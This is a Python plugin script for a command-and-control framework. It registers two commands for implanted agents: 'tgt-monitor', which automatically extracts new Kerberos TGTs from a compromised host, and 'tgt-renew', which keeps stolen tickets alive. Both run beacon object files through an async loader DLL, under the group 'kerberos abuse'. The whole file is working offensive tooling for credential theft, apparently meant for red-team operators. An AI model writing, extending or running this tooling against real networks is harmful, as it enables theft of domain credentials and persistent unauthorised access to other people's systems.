import conquest
import os.path

ASYNC_DLL = conquest.resources_root() + "/async-bof-loader/dist/async-bof.dll"
EXPORT_FUNC = "Run"
SCRIPT_DIR = os.path.dirname(__file__)

if not os.path.exists(ASYNC_DLL):
    raise FileNotFoundError(f"Async BOF DLL not found: {ASYNC_DLL}")
    
cmd_tgtMonitor = (
    conquest.createCommand(name="tgt-monitor", description="Monitor for new Kerberos TGTs and automatically extract them as they appear (async).", example="tgt-monitor --interval 5 --user DC01$,Administrator",
                           message="Tasked agent to monitor for new Kerberos TGTs and extract them.", mitre=["T1558"])
            .addFlagInt("--interval", "interval", "Polling interval in seconds (default: 60).", False, 60)
            .addFlagString("--user", "user", "Comma-separated list of target usernames (default: all users).")
            .setHandler(lambda agentId, cmdline, args: (
                interval := conquest.get_int(args, 0),
                user := conquest.get_string(args, 1),

                bof := os.path.join(SCRIPT_DIR, "tgt-monitor.x64.o"),
                params := conquest.bof_pack("iz", [
                    interval,       # i: Polling interval
                    user,           # z: Target user
                ]),

                conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("kerberos abuse")

cmd_tgtRenew =(
        conquest.createCommand(name="tgt-renew", description="Automatically renew Kerberos TGTs that are about to expire (async).", example="tgt-renew --interval 300 --threshold 30",
                               message="Tasked agent to automatically renew Kerberos TGTs.", mitre=["T1558"])
            .addFlagInt("--interval", "seconds", "Polling interval in seconds (default: 60).", False, 60)
            .addFlagInt("--threshold", "minutes", "Ticket renewal threshold in minutes (default: 15).", False, 15)
            .addFlagString("--user", "user", "Comma-separated list of target usernames (default: all users).")
            .setHandler(lambda agentId, cmdline, args: (
                interval := conquest.get_int(args, 0),
                threshold := conquest.get_int(args, 1),
                user := conquest.get_string(args, 2),

                bof := os.path.join(SCRIPT_DIR, "tgt-renew.x64.o"),
                params := conquest.bof_pack("izi", [
                    interval,       # i: Polling interval
                    user,           # z: Target user
                    threshold       # i: Remaining lifetime threshold
                ]),

                conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("kerberos abuse")